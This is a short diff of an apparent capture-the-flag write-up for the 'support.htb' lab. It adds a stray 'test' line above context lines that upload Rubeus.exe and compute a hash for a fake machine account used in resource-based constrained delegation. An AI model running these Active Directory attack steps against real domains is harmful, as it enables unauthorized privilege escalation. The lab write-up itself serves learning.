@@ -111,6 +111,7 @@ Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
 
 
 ```
+test
 upload Rubeus.exe
 .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
 58A478135A93AC3BF058A5EA0E8FDB71
